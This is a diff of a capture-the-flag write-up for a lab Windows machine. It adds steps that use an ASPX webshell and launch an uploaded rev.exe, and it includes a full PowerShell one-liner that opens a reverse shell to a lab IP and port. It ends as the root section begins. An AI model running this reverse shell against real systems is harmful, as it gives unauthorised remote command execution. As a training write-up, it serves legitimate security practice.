@@ -162,9 +162,31 @@ cmdasp.aspx shell located on kali /usr/share/webshells/aspx/
 
 ![image](https://user-images.githubusercontent.com/5285547/129187032-0f138d8c-da37-4928-8cbc-17ef57ad4022.png)
 
-Using a powershell payload I get a reverse shell. 
+Using a powershell payload I get a reverse shell or use the golang shell i found online.
+
+```
+# http://10.10.204.235:49663/nt4wrksv/cmdasp.aspx
+start c:\inetpub\wwwroot\nt4wrksv\rev.exe
+```
 
 ```
 powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("10.8.153.120",8888);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
 ```
+
+![image](https://user-images.githubusercontent.com/5285547/129194610-912d5e6e-8401-486d-b752-704fc473f3bb.png)
+
+The asp shell was much more stable so I ended up using that. 
+
+Navigating to Bob's Desktop we can find the user.txt flag. 
+
+![image](https://user-images.githubusercontent.com/5285547/129199055-38f6c5ae-cb52-4cfc-a3b2-0796d1dbccbf.png)
+
+---
+
+## Root
+
+Checking the system
+
+![image](https://user-images.githubusercontent.com/5285547/129198975-1c8d84d8-b2c5-4614-be16-33174cc062b6.png)
+
 
